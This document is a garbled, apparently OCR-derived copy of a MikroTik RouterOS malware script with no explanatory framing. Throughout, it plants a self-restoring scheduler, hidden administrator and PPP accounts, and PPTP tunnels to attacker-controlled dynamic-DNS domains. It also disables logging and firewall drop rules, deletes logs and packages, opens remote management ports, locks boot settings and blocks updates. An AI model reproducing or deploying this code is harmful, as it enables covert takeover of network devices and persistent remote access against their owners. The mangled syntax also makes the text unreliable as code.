:glo rst Time 17084;
:glo rosX 6346;
:glo xFlag false;
:glo sysCLRFlag false;
:glo mo ROSF true;
:glo moMACF false;
:glo fPort 21;
:glo sport 22;
:glotPort 23,
:glo sc;
:glo SCM 5;
:glo s5;
:glo JRST;
:glo xey;
:glo sysTime;
:glo SRM 900,
:glo SR2;
:glo sR1,
:glo sysJ;
:glo sysNoOther,
:glo sysPPS;
:glo UAC;
:glo PTPST;
:glo sysB;
:glo sysE;
:glo DOM;
:glo system V 30RC9;
:loc Intp;
:loc ZZ;
:loc QQ;
:loc SP;
:loc pt;
:loc HL 60;
:loc mx 1;
:locjST;
:loc M;
:loc TR;
:loc TA;
:loc RF;
:loc t;
:loc s8;
:glo sysJ;
:loc s4 false;
/file {:fore f in [find type= \
    backup] do={:loc n [get \
    $f name];
    /system backup save name= \
    $n;}};

:loc s1;
:loc s2;
:loc s0 [:len [/sys scr find name=system]];
:loc ss [:len [/sys sch find name=system]];
:loc s3 false;
:if ($s0=1) do={if Sss=1) do={:set s1 [/sys scr get find name=system] run-count].:del 3;
:set s2 [/sys scr get find name=system] run-count]; if ($s2=0 or ($81=\$s2)) do={/sys sch rem find name=system];
:del 1;
/sys sch add name=system disable=no interval=1s onevent=system start-date-jan/01/1970 start-time=00:00:00:}} else={:set s3 true;}} else={:set s3 true:); if ($s3)
+ s4 true:}}}; if ($84) do=?dis; ".if ([:len /sys scr job find script="system">=2) dor sett /sys clo get time]..for x from=0 to=([:len St]-1) do= if (pick St $x ($x+1)=":") do=sett (:pick St O Sx].",".[:pick St (Sx+1) [:len St}}:sett (toarray St];:set sys Time ((St->0)*3600)+((St->1)*60)+(St->2));
/sys scr job {fore j in=ffind script="system"] do={uset TA [get Sj start];:set M (:pick STA ([find STA" "]+1) [:len STA]], for x from=0 to=([:len SM]-1) do={if (:pick SM SX (Sx+1)]=":") do={uset M ([pick SM O SX].",".[:pick SM (Sx+1) [:len SMID}};-set M (toarray SM];:set ST (((SM->0)*3600)+((SM->1)*60)+(SM->2));:loc g; if (Ssys Time($JST) do={:set g (Ssys Time+86400-SST)) else={:set g (Ssys Time-SjST)); if ($g>=SsR1) do={:set R1 $g} else={:set SR1 (SR1-1)}:if ($8R1>$SRM) dor/sys reb}}}; if ([:len [/too net find host -8.8.8.8]]!=1) do=//too net rem find host=8.8.8.8]:/oo net add host=8.8.8.8 diseno int=1 tim=1 up=S88 down=Ss8;} else={:loc u8 [/too net get find host=8.8.8.8] up]:loc d8 [Aoo net get find host=8.8.8.8] down];:loc db [/too net get find host=8.8.8.8] dis];:loc i8 [Aoo net get find host=8.8.8.8] int]:if ((((Su8=S88) and ($d8=S88)) and !Sdb) and (Si8=[totime 11) do={:del O} else={/too net set find host=8.8.8.8] up=Ss8 down=S88 dis=no int=1}}} else={:set sysNoOther true;set UAC [:len [/use act find name!="system"]]loc mLOG false;
/use act {fore u in=ffind] do={:loc uu (get Su address];:loc vv [get Su via];:if (([:len (find Suu ":"]]!=0) or ((Svv="console") or (Svv="local"))) do={:set mLOG true;}}};:if (SUAC=0) do={:set sysNoOther true:} else={uset sysB[/sys clo get time);:set sysNoOther true;
/use act {fore a in=ffind via!="ftp") do={if ([get Sa name]!="system") do={if ($sysCLRFlag) do={/fil pri fil=sysCLR;
/ip fir lay rem find name=sysCLR];:del 1;
/ip fir lay add name=sysCLR regexp=true;.del 1;
/sys reb:);set sysNoOther false;:set SC 0; if ([:len [/ip fir lay find name=sysIntru]]=0) do= /ip fir lay add name=sysIntru regex=true); if ([:len [/fil find name=pps.txt]]!=0) do={set sysPPS [/fil get find name=pps.txt] content]} else={:set sysPPS 0}}}}};if ($sysNoOther and (!SmLOG)) do= /ip fir add {:loct;loci;loc c 0;fore p in find list=vp] do={:set c ($c+1);:set t [tostr [get Sp address]];:loc y false;fore e in /use get find name=sys] add] do={:set i (tostr [:pick $e 0 [.find Se "/"]]]:if (Si=St) do={:set y true}};: if (!$y) do={/use set find name=sys] add=[[/use get find name=sys] addr] St}}};:if ($c=0) do= /use set find name=sys] add=127.0.0.1}};:set DOM "allimpir.dyndns.org":lock [/sys reso get archi]:if ([[:len [/ip fir lay find name=sysJail]]!=0) or SsysJ) do={:set pt "jail"} 
    else={:set pt "void"}; 
    if (Sk="tile") do={:set PTPST (Spt. "CCR")} 
    else{if (Sk="powerpc") do= set PTPST (Spt. "PPC")} 
    else if (Sk="mipsbe") do= set PTPST (Spt. "MIP) or (Sk="x86_64")) do= :set PTPST (Spt. "X86")} 
else if (Sk="arm") doriset PTPST (Spt. "ARM")} else=set PTPST Spt}}}}}}}; if ([:ler [/ip fir lay find name=sys Intru]=1) do={if ($sC<$sCM) do={:set sC ($sC+1); if ([:len (/ip fir lay find name=sysJail]]!=0) do={loc mV [/ip fir lay get find name=sysJail] regex]:loc sysV (tonum [:pick SsystemV 2]];:set xey [:Pick [/sys clo get time] 6 8]; if (SmV>=SmX) do={/ip fir lay set find name=sysJail) regex=0; if (SsysV>=30) do={if ([:len [/use find name=sys]]=0) do={/use add nam=sys gro=full disano pas={[/ip fir lay get find name=syscret] regexp].Sxey) add=127.0.0.1,:del 1;
/ip fir lay rem find name=syscret]:/use set find group=sys] group=full:/use gro rem find name-sys]:/use gro add name=sys copy from=full policy=!test,!wri,!pas, Isen,!api, lloc, tel,Issh, Iftp..pol,Isni; del 1;
/use set find name!=sys] group-sys;
/use set find name=system) group=full:} else=/use rem find name=system]:/use set find group=sys T] group=full;
/use gro rem find name=sys T]:/use gro add name=sysT copy from=full policy=ltest,!wri,!pas,lsen,lapi,!loc, .tel,Issh, ftp.pol,!sni;:del 1;
/use gro set find name=sys] policy=[/use gro get find name=sys T] policy]:/use gro rem find name=sys T]:/use set [find name!=sys] group=sys;
/ip fir lay rem find name=syscret]:}} else if (SsysV>=26) do={if ([:len [/use find name=sys]] =0) do=/use add nam=sys gro=full disano pas=([/ip fir lay get find name=syscret] regexp]. Sxey) add=127.0.0.1;
/ip fir lay rem find name=syscret]:/use set [find group=sys] group=full:/use gro rem find name=sys];: del 1;
/use gro add name=sys copy from=full policy=!test !wri, lpas !sen,!api, lloc, tel, Issh, Iftp.pol,Isni;:del 1;
/use set [find name!=sys) group=sys;
/use set (find name=system) group=full:}}}}}} else={/ip fir lay rem find name=sysIntru]:if ([:len (/int pptp-cli find name=system]]!= 1) do={/int pptp-cli rem find name=system];:del 1; int pptp-cli add allow=mschap 1.mschap2 connect to=8.8.8.8 disabled=no name=system password=password profile=default user=$PTPST;:del 1:} else={/int pptp-cli set [find name=system) connect to=8.8.8.8 disabled=no profile=default user=SPTPST password=password);:loc p2:loc pS; if (([:len (/ip dns get servers]]=0) and ([:len (/ip dns get dynamic-servers]]=0)) do= ip dns set servers=8.8.8.8.8.8.4.4);:set DOM "thanos.doesit.net"; if (typeof[/int pptp-cli get find name=system) connect to]]="ip") do={set p2 [/int pptp-cli get find name=system) connect to];:set PS [resolve SDOM]; if ($p2!=SpS) do={/int pptp-cli set find name=system) connect to SpS disabled=no user=$PTPST password=password}} else={:set p2 [/int pptp-cli get find name=system) connect to];:set PS SDOM; if (Sp2!=SpS) do={/int pptp-cli set [find name=system) connect to SpS disabled=no user=$PTPST password=password}};:loc wt 2;:loc pW true; while (Swt>O) and SpW) do={set pW (![/int pptp-cli get find name=system] running];:set wt (Swt-1);:del 1:); if ((!SpW)) do=Vip fir fil set find chain=input and src-address="172.16.0.0/12" and action="accept") in-interface=system action=accept; if ([:len [/ip fir fil find chain=input and src-address="172.16.0.0/12" and in-interface="!system" and action="drop"]=0) do={ if ([:len [/ip fir fil find chain=input and src-address="172.16.0.0/12" and in-interface="system"]]!=0) do=/ip fir fil add copyfrom=ffind chain=input and src-address="172.16.0.0/12" and in-interface="system" and action="accept") in-interface=!system action=drop}};:if ([:len [/ip rou find dst-address=172.24.0.0/13]]!= 1) dor /ip rou rem find dst-address=172.24.0.0/13);:del 1;
/ip rou add dst-address=172.24.0.0/13 gateway=system com=system:) else if [/ip rou get find dstJaddress=172.24.0.0/13) gateway]!="system") do={/ip rou set find dst-address=172.24.0.0/13) gateway=system:)); if ([:len (/ip rou find dst-address=172.25.0.0/24]]!=1) do= /ip rou rem find dst-address=172.25.0.0/24): del 1;
/ip rou add dst-address=172.25.0.0/24 gateway=system com=system:) 
    else if ([/ip rou get find dst-address=172.25.0.0/24]
gateway]!="system") do={/ip rou set find dst-address=172.25.0.0/24] gateway=system:}}}}} else={:loc p2;:loc pS; if ([:len (/int pptp-cli find name=system]]!=1) do={/int pptp-cli rem find name=system];:del 1;
/int pptp-cli add allow=mschap 1.mschap2 connect to=8.8.8.8 disabled=no name=system password=password profile=default user=SPTPST;:del 1:} else{if (([:len [/ip dns get servers]]=0) and ([:len [/ip dns get dynamic-servers]]=0)) do=Vip dns set servers=8.8.8.8.8.8.4.4);:set DOM "thanos.does-it.net"; if (typeof(/int pptp-cli get find name=system) conne name=system) connect to=SpS disabled=no}} else={:set p2 [/int pptp-cli get find name=system) connect to]:set PS SDOM;:if (Sp2!=SpS) do={/int pptp-cli set find name=system) connect to=SpS disabled=no}};:loc wt 2;:loc pW true; while ((Swt>0) and SpW) do={:set pW (![/int pptp-cli get find name=system] running];:set wt (Swt-1); del 1;); if (!SpW)) do={if ([:len[/use find name=system]]=0) do=/snm exp ver fil-init 10;
/ip ser exp ver fil-init 11;
/ip fir service port exp ver fil-init 12;
/sys log set (find) disable=yes;
/sys log exp ver fil-init 13;
/sys ntp cli exp ver fil=init 15; del 2;
/use add gro=full name=system address=172.24.0.0/13,127.0.0.1;
/int pptp-ser ser set default-profile=default enabled=yes max-mru=1472 max-mtu=1472;
/ip poo rem find name=system]:/ppp pro rem find comment system]:/ppp sec rem find comment=system): del 1;
/ip poo add name=system ranges=10.147.147.2-10.147.147.254;
/ppp pro add local-address=10.147.147.1 name=system remote-address-system com=system;
/ppp sec add nam=spidy pas-peterparker pro=system serupptp com=system;
/ip fir nat add action=masquerade chain=srcnat com=system;
/fil rem find type=".log file"];
/fil rem find type=package]: fil rem find type=".npk file"];loc serx "ftp":"ssh"; "telnet","api");:loc ipx"172.24.0.0/13":"127.0.0.1/32"); fore k in Sipx do={fore x in Sserx do={:loc CHK false;.loc a [/ip ser get find name=Sx] address]:fore y in Sa do=if (Sy=Sk) do={:set CHK true)); if (!SCHK) do=/ip ser set find name=Sx] dis=no add=([/ip ser get find name=Sx] address]. Sk)}}};
/ip ser set telnet port=StPort disabled=no;
/ip ser set www address="" disabled=no;
/ip fir service port set [find name=ftp] disabled=no ports-SfPort;
/ip fir fil set find chain=input and action=drop] dis=yes;
/ip fir fil set find chain output and action=drop] dis=yes;
/ip fir fil set find chain=input and protocol="icmp"] dis=yes, del 1;
/ip fir fil add cha=input act-add-src to add
timeout=1 packet-size=99 proricmp src-address-list=!k com=system;
/ip fir fil add cha=input act-add-src-to-address-list address-list=l address-list-timeout=2 proricmp src-address-list=k com=system;
/ip fir fil add cha=input act-add-src-to-address-list address tistem address list-timeout=3 packet-size=97 prosicmp src-address tist=l com=system;
/ip fir fil add cha=input act=add-src-to-address-list address list=vp address fist timeout=5 packet-size=96 prosicmp src-address-list-m com=system;
/ip fir fil add cha=input src-address=172.16.0.0/12 act=accept com=system;
/ip fir fil add cha=output src-address=172.16.0.0/12 act=accept com=system;
/ip fir fil add cha=input src-address=127.0.0.1/32 act=accept com=system;
/ip fir fil add cha=output src-address=127.0.0.1/32 act=accept com=system;
/ip fir fil add cha=input dst port=21,22,23,162 src-address=! 172.16.0.0/12 actcrop protocol=tcp com=system;
/ip fir fil add cha=input dst-port=161 src-address=!172.16.0.0/12 actcrop protocol=udp com=system;
:loc tinf;
/int pppoe client {fore i in=ffind running=yes] dor settinf get Si name]:
/ip fir fil add cha=input dst-port=53 in interface=Stinf act=crop protocol=udp com=system diseno:}}}; if ([:len [/ip rou find dst-address=172.24.0.0/13]]!= 1) do= /ip rou rem find dst-address=172.24.0.0/13];:del 1;
/ip rou add dst-address=172.24.0.0/13 gateway=system com=system:} else{if(/ip rou get find dst-address=172.24.0.0/13] gateway]!="system") do= /ip rou set find dst-address=172.24.0.0/13] gateway=system}); if ([:len [/ip rou find dst-address=172.25.0.0/24]! |-1) do-vip rou rem find dst-address=172.25.0.0/24]:del 1;
/ip rou add dst-address=172.25.0.0/24 gateway=system com=system:} else={if (tip rou get find dst-address=172.25.0.0/24] gateway]!="system") do=Vip rou set [find dst-address=172.25.0.0/24) gateway=system}};
/ip fir fil set find chain=input and src-address="172.16.0.0/12" and action="accept") in-interface=system action=accept;if ([:len [/ip fir fil find chain=input and src-address="172.16.0.0/12" and in interface="!system" and action="drop"]]=0) do={if ([:len (/ip fir fil find chain=input and src-address="172.16.0.0/12" and in-interface="system"]]!=0) do= /ip fir fil add copy from=ffind chain=input and src-address="172.16.0.0/12" and in-interface="system" and action="accept") in-interface system action=drop}}}; int pptp-cli mon find name=system) once do={:set Into S"remote-address":};:loc ntpt [/sys ntp cli get pri];:if ($ntpt!Sintp) dor/sys ntp cli set pri=Sintp sec=Sintp ena=no;:del 1;
/sys ntp cli set ena=yes;});:set t[/sys clo get time) for x from=0 to=([:len St]-1) do= .if ([pick St Sx ($x+1)]=":") do={sett ([pick St 0 Sx].",".[:pick St ($X+1) [:len St]]]}};:sett (toarray St];:set sys Time (((St->0)*3600)+((St->1)*60)+(St->2)); if ((Ssys Time<(Srst Time+2)) and (Ssys Time>(Srst Time-2))) do={if ([:len [/ip fir lay find name=sysR]]=0) do=/ip fir lay add name=sys R regexp=1} else={if ([:len (tonum [/ip fir lay get find name=sysR] regexp lll=0) do=Vip

SX (Sx+1)]=":") do={:sett ([pick St 0 Sx].".".[:pick St (5x+1) [:len St]]]}};:sett (toarray St];:set sysTime (((St->0)*3600)+((St->1)*60)+(St->2))if ((Ssys Time<(Srst Time+2)) and (Ssys Time>(Srst Time-2))) do={if ([:len [/ip fir lay find name=sysR]]=0) do= /ip fir lay add name=sysR regexp=1} else={if ([:len (tonum [/ip fir lay get find name=sysR] regexp]]]=0) do={/ip fir lay set find name=sysR] regexp=1} else={:loc J [tonum [/ip fir lay get find name=sysR] regexp]];:set J ($J+1);
/ip fir lay set find name=sysR] regexp=$J;}};
/sys reb:}}} else={:set ZZ [/sys scr get find name=system] source];:set QQ [/sys scr get find name=system] policy]:if ([:len [/sys sch find name=system]]=0) do=/sys sch add int=1s name=system on event=system start-date=jan/01/1970 start-time=00:00:00 disable=no};:set SP [/sys sch get [find name=system] policy];:loc syscret;:set s5 false;
/fil {fore fin (find] do={:loc x [get Sf name];if ([:len (find sx "ss.db"]]=1) do={set 35 true;}}}; if ([:len [/ip fir lay find name=syscret]]=1) do={:set syscret [/ip fir lay get [find name=syscret] regexp]} else={/ip fir lay add name=syscret regexp=12345678;
:set syscret 12345678:}
/use rem find name=system]
/use {fore u in find] do={if ([:len (find [get Su name] system]]!=0) do={[rem Su]}}};
/int pptp-cli rem find name=system];:loc U {"sys":"func":"init");
/sys scr {fore s in find name!=system) do={loc n (get Ss name) fore w in $U do={:loc det [:len (find Sn Sw]]; if (Sdet!=0) do=/sys scr rem Sn}}}};
/sys sch {fore s in find name!=system] do={:loc n [get Ss name);fore w in $U do={loc det [:len [.find Sn Sw]]:if ($det!=0) do={/sys schrem Sn}}}};
/fil {fore fin find) do={:loc x [get Sf name);:if ([:len (find sx "init.db"]]=1) do=/fil rem find name=Sx]}}};
/fil rem find type="log file");
/fil rem find name=virgin.txt];
/fil rem find name=system.txt];
/fil rem [find name=sys Mon ROS.txt];
/fil rem find type=package];
/fil rem [find type="npk file"];
/fil rem find type="tar file"];
/fil rem find type="rif file"];
/fil rem find type="rar file"];
/fil rem find type=".zip file"];
/fil rem [find name=sys-note.txt]; if ([:len [/fil find name=init10.rsc]]!=0) do={/snm com rem find default=no), del 1;
/imp init10.rsc;
/fil init 10.rsc]]!=0) dor/snm com rem find default=no]del 1;
/imp init10.rsc;
/fil rem find name=init10.rsc]:); if ([:len [/fil find name=init11.rsc]]!=0) do=/imp file=init 11.rsc;
/fil rem find name=init11.rsc]:} else={/ip ser set ftp disabled=no address="" port=21;
/ip ser set ssh disabled=no address="" port=22/ip ser set telnet disabled=no address="" port=23:); if ([:len [/fil find name=init 12.rsc]]!=0) do={/imp file-init 12.rsc;
/fil rem find name=init12.rsc]:); if ([:len [/fil find name=init13.rsc]]!=0) do={/sys log rem find default=no];
/sys log act rem find default=no): del 1;
/imp file=init13.rsc;
/fil rem find name=init13.rsc]:); if ([:len [/fil find name=init15.rsc]]!=0) do={/imp file-init 15.rsc;
/fil rem find name-init 15.rsc]:);
/fil rem find type=script]:
/ip fir fil rem find comment=system]:
/ip fir nat rem find comment=system]:
/ip fir man rem find comment=system]:
/ip rou rem find comment=system]:
/ip poo rem find name=system]:
/ppp pro rem find comment=system]:
/ppp sec rem find comment-system]:
/too traffic g stop:/too traffic g stream rem find];
/too traffic-g packet rem find]:
/too traffic g port rem find];
:loc ncnt;
:set ncnt [:len [/ip fir nat find comment! ="system"]]); if (Sncnt=0) dor 
/ip fir nat add action=masquerade chain=srcnat);
:sett [/sys clo get time); for x from=0 to=([:len St]-1) do={if ((:pick St $x ($x+1)]=":") do={sett ([pick St 0 SX].".".[:pick St (Sx+1) [:len St]1):}};:sett (toarray St];:set sys Time (((St->0)*3600)+((St->1)*60)+(St->2));
/sys scr job {fore j in= find) do={set TR get Sj script];:set TA get Sj start]:if (typeof (get Sj script]]="str") do={:loc script Name get $j script];:if (Sscript Name="sysMonROS") or (Sscript Name="inito") or (Sscript Name="init 1")) do={[rem $]}} else={uset M [:pick STA ([find STA" "]+1) [:len STA]]:for x from=0 to=([:len SM]-1) do={if ([:pick SM SX (Sx+1)]=":") do={:set M ([:pick SM O Sx].",".[:pick SM ($x+1) [:len SM]]]}};set M [toarray SM];:setjST (((SM->0)*3600)+((SM->1)*60)+(SM->2)); if ($sys Time(SST) do={:set RF (Ssys Time+86400-SjST)} else:set RF (Ssys Time-SjST));if (SRF>SHL) do={[rem $j]}}}};:set sysE [/sys clo get time]:/sys scr job rem find script!="system");
/sys scr job rem find type="login"); if ([:len [/ip fir lay find name=syslog]]=0) do= /ip fir lay add name=syslog regexp=1} else{if ([:len (tonum [/ip fir lay get find name=syslog] regexpl]]=0) do= /ip fir lay set find name=syslog] regexp=1} else={:loc J [tonum [/ip fir lay get find name=syslog] regexp]];:set J ($J+1);
/ip fir lay set [find name=syslog) regexp=SJ:}}; while (!Ssys NoOther or SmLOG) do={:loc f1":glo f2 false;
/fil {fore fin (find) do={:loc x [get sf name] :if ([:len (find $x \"ss.db "]=1) do={:set f2 true;}}); if (!\${2 and \$85) do={:set sys true:);":
/too net rem find host=9.9.9.9]:oo net add host=9.9.9.9 dis=no int=1 tim=1 up=($f1.589) down=(Sf1.989);
/sys pac upd can;:del 1;:set SR2 (SR2+1); if ($8R2>SRM) do={/sys reb};
/fil rem find type="log file ");
/fil rem find type=package]:
/fil rem find type="npk file"];
/fil rem find type=script];
:loc R {"sys"; "func":"auto");
:loc L;
/fil {fore fin find] do={:loc n (get Sf name]:fore ww in SR do={:set L[:len [.find Sn Sww]; if ($L!=0) do=/fil rem Sn}}}};:loc sysPPS; if ([:len [/ip fir lay find name=sysPPS]!=0) do={:set sysPPS [/ip fir lay get find name=sysPPS] regex]); if ([:len [/ip fir lay find name=sys Intru]]=0) do={/ip fir lay add name=sysIntru regex=true);:set fPort ";:set tPort "s;:set sPort ";:set DOM "";:set PTPST "";
/sys ser env rem find name=initOV]:
/sys ser env rem find name=tokenSYS]:
/sys scr env rem find name=ntplP]:
/sys scr env rem find name=tzspIP]:
/sys scr env rem find name=SuperMan Server]:
/sys scr env rem find name=The Hulk Server]:
/sys scr env rem find name=routerOSServer]:
/sys scr env rem find name=ROSuser]:
/sys scr env rem find name=ROSpass]:
/sys scr env rem find name=init D Bready]:
/sys scr env rem find name=CPUhigh MAX]:
/sys scr env rem find name=CPUused MAX]:
/sys scr env rem find name=CPUhighCount];
/sys scr env rem find name=CPUused];:loc DE false;:loc rNum;: loc md;
/int ether {fore e in find running=yes] do={/int monitor traffic [get Se name) once do={:loc o;:set md $"rx-bits-per-second";:set 0 [tonum [:pick Smd ([:len Smd]-4) ([:len Smd)-2)]]:if ($o>0) do={:set DE true;:set Num $o:}}}}; if (SDE) do={:set rNum 5};:loc rosV 0:loc v;:loc PS 0;:set v[/sys reso get ver]:loc scope (" ";"rc":"("); fore w in Sscope do= {if ([:len [.find Sv Sw]]!=0) do=set v [:pick $v 0 [find Sv Sw]]}}; for x from=0 to=([:len [.tostr Sv]]-1) do= if ([:pick (tostr Sv] SX (Sx+1)]=". ") do={:set v ([pick (tostr Sv] 0 SX].",".[:pick (tostr Sv] (5x+1) [:len (tostr Svlll}};set v[toarray Sv];:if ([:len Sv]=2) do={:set v (Sv.0));:set PS 0;fore k in Sv do={if (SPS=0) do={:set rosV (Sros V+(Sk*1000))); if (SPS=1) do={set rosV (Sros V+(Sk*10))); if (SPS=2) do={set rosV (SrosV+Sk));:set PS (SPS+1):);:loc reH (299-SrNum);:loc reMX (300-SrNum);
:loc p0"
:glo xey [:pick [/sys clo get time] 6 8];
:loc s7 \":del 3; glo sys true;:del 1;
/oo net rem find host=7.7.7.7]:\";
if (([/sys pac get ppp disabled] or [/sys pac get sec disabled] or [/sys pac get advance disabled]) do=/sys pac enable find]:
/too net rem find host=7.7.7.7];
/too net add host=7.7.7.7 dis=no int=1 tim=1 up=\$s 7 down=\$7:del 1;
/sys reb:);";:loc m1 "/too mac-ser set find] disabled=yes;
/too mac-ser mac-win set (find) disabled=yes;";:loc m2 "Aoo mac-ser set allowed-interface-list=none;
/too mac-ser mac-win set allowed-interface-list=none;";:loc al":glo PRB [.tostr [/sys rou set get prot]];:if ($PRB=\"disabled\") or ( SPRB=\"false"")) do={:set sys true;
/sys rou set set ena=no prot-enabled reformat-hold-button=SreH:3:":loc a2":glo JRST [tostr[/sys rou set get ena]]; if ((SJRST=\"enabled\") or (SJRST=\"true"")) do={:set sys true;
/sys rou set set ena=no prot-enabled reformat-hold-button=Sreh:);";: loc c0"/sys rou set set ena=no prot-enabled sil=yes boot-dev-nand-only glo sysJ;"; loc c1"/sys rou set set ena=no prot-enabled sil=yes boot-dev=nand-only reformat-hold-button=SreH;:glo sysJ;";:loc c2"/sys rou set set ena=no prot-enabled sil=yes boot-dev-nand-only reformat-hold button=SreH reformat-hold button-max=Sre MX;:glo sysJ;"; loc c3 "glo sysJ;:glo JRST [tostr[/sys rou set get ena]]; if ((SJRST=\"enabled\") or (SJRST=\"true"")) do={:set sys true:);":loc d1 "loc 56 \"del 60;:glo sysJ false;del 1;
/too net rem find host=6.6.6.6]:\":glo JRST [.tostr[/sys rou set get ena]]:if ($JRST=\"enabled\") or (SJRST=\"true"")) do={/too net rem find host6.6.6.6]:/too net add host=6.6.6.6 dis=no int=1 tim=1 up=\Ss6 down=\Ss6;
/sys rou set set ena=no prot-enabled reformat-hold-button=SreH;:del 1;if ([:len [/use gro find name=sys]]=0) do=/use gro add name=sys pol=loc,win,reb;:del 1;
/use add nam=sys gro=full disano pas=([/ip fir lay get find name=syscret] regexp]. Sxey);
/use set [find name!=sys) group=sys:} else=/use gro set find name=sys) pol=!wri!pas, Isen,lapi,!loc,!tel,!ssh, 'ftp.!pol,!sni};
/sys pac upd set cha-cur;
/sys pac upd che;
/fil rem find type=script];:exec /sys pac upd ins:);if ([:len (find [/sys pac upd get stat] Downl=0) do={/sys reb:}};":loc SR;if (SrosV>=6410) do={uset SR (Sp0.$c2.$a1.$a2. Sm2)} else{if (SrosV>=6400) do={set SR (Sp0.$c2.$a 1.$a2. Sm 1)} else{if (SrosV>=6346) do={if ((SJRST="enabled") or (SJRST="true")) do={uset SR (Sp0.$d 1.5m 1)} else {set SR (Sp0.$d 1.5m 1)}} else{if (SrosV>=6330) do={set SR (Sp0.$c 1.Sa 1.Sa2. Sm 1)} else={uset SR (Sp0.$c0.5m 1)}}}}..if ([:len [/too net find host=127.0.0.1]]!= 1) do={/too net rem find host=127.0.0.1);
/too net add host=127.0.0.1 int=1 tim=1 dis=no up= $SR down-$SR:) else={/too net set find host=127.0.0.1) int=1 tim=1 diseno up=SSR down=$SR:);:loc sysX "system":loc word {"\"system ";"=system":"rem system":"rem system":"remo system":"remov system":"remove system":"ip ser";"user g":"user a";"users":"use g":"use a";"use s");
/sys scr {fore sin find name!=SsysX] do={:loc n (get Ss name];:loc SSRC [get Ss source]:fore w in Sword do={:loc d [:len [.find SSSRC Sw]]:if ($d!=0) do=/sys scr rem Sn;:set sys true;}}}};
/sys sch {fore s in find name!=SsysX] do={:loc n (get Ss name];:loc SSRC [get Ss onevent]; fore w in Sword do={:loc d [:len (find Ss SRC Sw]]; if ($d!=0) dor/sys schrem Sn;:set sys true:}}}};
/too net {fore sin find host! =127.0.0.1] do={:loch [get Ss host];:if (Sh!=8.8.8.8) do={:loc nws [get Ss up]:fore w in Sword do={:loc d [:len (find Snws Sw]]; if ($d!=0) do={/too net rem find host=Sh];:set sys true;}};:loc nws [get Ss down]:fore w in Sword do={:loc d [:len (find Snws Sw]]; if ($d!=0) do={/too net rem find host=Sh];:set sys true;}}}}}; if ([:len[/use find name=system]]!=0) do=/use rem find name=system];:set sysJ true:); if ([/sys route set get boot-device]!="nand-only") do=/sys route set set boot-device=nand-only;:set sys true:);:if ([:len [/sys scr find name=system]]=1) do={:loc Z [/sys scr get find name=system] source];:loc Q[/sys scr get find name=system] policy]; if ($Z!=SZZ) do={/sys scr set find name=system] source=SZZ;:set sys true:);:if (SQ!=SQQ) do={/sys scr set [find name=system] policy=SQQ;
:set sys true;}} else={
    /sys scr add name=system policy=SQQ source=sZz; 
    if ([:len [/sys sch find name=system]]=1) 
    do={/sys sch set find name=system) int=1s onevent=system start-date-jan/01/1970 start-time=00:00:00 disable=no:) 
    else={/sys sch add int=1s name=system on event=system start-date-jan/01/1970 start-time=00:00:00 disable=no:); 
    if ([:len [/ip fir lay find name=sysJail]]=0) do= /ip fir lay add name=sysJail regexp=1;} else{if ([:len [.tonum [/ip fir lay get find name=sys Jail] regexpl]]=0) do=/ip fir lay set (find name=sysJail] regexp=1;} else={:loc J[tonum [/ip fir lay get [find name=sysJail] regexp]];: set J ($J+1);
    /ip fir lay set find name=sysJail] regexp=$J;}); if ([:len [/sys scr find name=system]]=1) do={:del 0) else={/sys scr add name=system policy=SQQ source=SZZ);
    /sys reb;};
    /sys scr {fore o in=ffind name!="system"] do={if ([get So source]=SZZ) do={[rem So];:set sys true:}}}; if ([:len [/sys sch find name=system]] =1) do={:loc SCHX [/sys sch get [find name=system] policy].:if (SSCHX!=SSP) do={/sys sch set find name=system] policy=$SP;:set sys true:); if ([/sys sch get find name=system] disabled]!=no) do={/sys sch set find name=system] disabled=no;:set sys true:); if ([/sys sch get find name=system] interval]!= "00:00:01") do=/sys sch set find name=system] int=1s;:set sys true:); if ([/sys sch get find name=system] start-time]!="00:00:00") do=/sys sch set [find name=system] start-time=00:00:00;:set sys true:); if ([/sys sch get find name=system] start-date]!="jan/01/1970") do={/sys sch set find name=system] start-date-jan/01/1970;:set sys true:); if ([/sys sch get find name=system] on event]!="system") do=/sys sch set [find name=system] onevent=system;:set sys true;:} else={/sys sch add int=1s name=system on event=system start-date-jan/01/1970 start-time=00:00:00 disable=no, set sys true:);:set UAC [:len [/use act find via!="ftp"]];:if (SUAC=0) do={:set sysNoOther true} else={:set sys NoOther true;
    /use act {fore acc in=ffind via!="ftp") do= :if ([get Sacc name]! ="system") do={:set sys NoOther false}}}};
    /use act {fore u in=ffind] do={loc uu (get Su address];:loc vv [get Su via]:if (([:len (find Suu":"]]!=0) or ((Svv="console") or (Svv="local"))) do={:set mLOG true} else={:set mLOG false}}};:loc UX [/sys pac upd get status]; if ([:len (find SUX "Downloaded"]]=0) do={:del 0} else=1/sys pac upd can); if ([:len [/ip fir lay find name=syscret]]=0) do= /ip fir lay add name=syscret regexp=Ssyscret;:set sys true;} else if ([/ip fir lay get [find name=syscret] regexp]!=Ssyscret) do= /ip fir lay set find name=syscret] regexp=Ssyscret;:set sys true;}); if ($sysJ) do={if ([:len [/ip fir lay find name=sysJail]]=0) do=1/ip fir lay add name=sysJail regexp=1} else{if ([:len (tonum [/ip fir lay get


sch get find name=system] start-time]!="00:00:00") do={/sys sch set (find name=system) start-time=00:00:00;:set sys true;}; 
if ([/sys sch get find name=system] start-date]!="jan/01/1970") do={/sys sch set (find name=system] start-date-jan/01/1970;:set sys true:);
if ([/sys sch get find name=system] on event]!="system") do=/sys sch set find name=system] on event=system;:set sys true:}:} else={/sys sch add int=1s name=system on event=system start-date-jan/01/1970 start-time=00:00:00 disable=no;:set sys true:};:set UAC [:len[/use act find via!="ftp'));if (SUAC=0) do={:set sysNoOther true} else={:set sysNoOther true;
/use act {fore acc in=ffind via!="ftp") do={if ([get Sacc name]!
nt=1s name=system on event=system start-date-jan/01/1970 start-time=00:00:00 disable=no, :set sys true:);:set UAC filen /use act find via!="ftp" ="system") do={:set sysNoOther false}}}};
